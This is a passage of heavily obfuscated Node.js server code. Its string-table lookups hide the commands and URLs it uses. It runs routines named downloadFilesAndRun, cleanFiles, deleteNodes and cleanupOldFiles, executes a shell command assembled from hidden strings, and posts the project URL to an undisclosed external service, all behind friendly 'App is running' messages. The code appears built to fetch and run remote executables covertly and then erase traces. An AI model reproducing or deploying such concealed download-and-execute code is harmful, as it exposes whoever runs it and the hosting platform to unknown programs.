_0xaaa995=_0x391c94;console[_0xaaa995(0x29d)](),console[_0xaaa995(0x20a)]('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x391c94(0x2a1)+_0x12b08e[_0x391c94(0x22f)]('\x20')+_0x391c94(0x21c),_0x5c78dd=>{const _0xefb428=_0x391c94;console[_0xefb428(0x29d)](),console['log'](_0xefb428(0x20e)),console[_0xefb428(0x20a)](_0xefb428(0x23b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x728caf=_0xc65993;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x728caf(0x20a)](_0x728caf(0x1fe));return;}try{const _0x10234c=await axios[_0x728caf(0x214)](_0x728caf(0x21d),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x728caf(0x1f7)}});return console['log'](_0x728caf(0x239)),_0x10234c;}catch(_0x101939){return console[_0x728caf(0x1f8)](_0x728caf(0x283)+_0x101939['message']),null;}}function _0x59dc(_0x4569db,_0x216514){const _0x1c14e3=_0x964f();return _0x59dc=function(_0x4b0ad9,_0x35d7d8){_0x4b0ad9=_0x4b0ad9-0x1e3;let _0x5e3d9d=_0x1c14e3[_0x4b0ad9];return _0x5e3d9d;},_0x59dc(_0x4569db,_0x216514);}async function startserver(){const _0x215cb8=_0xc65993;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x26e1d7){console[_0x215cb8(0x1f8)]('Error\x20in\x20startserver:',_0x26e1d7);}}startserver()[_0xc65993(0x261)](_0x1a6c69=>{const _0xc3da7=_0xc65993;console[_0xc3da7(0x1f8)](_0xc3da7(0x220),_0x1a6c69);}),app[_0xc65993(0x29c)](PORT,()=>console[_0xc65993(0x20a)](_0xc65993(0x248)+PORT+'!'));
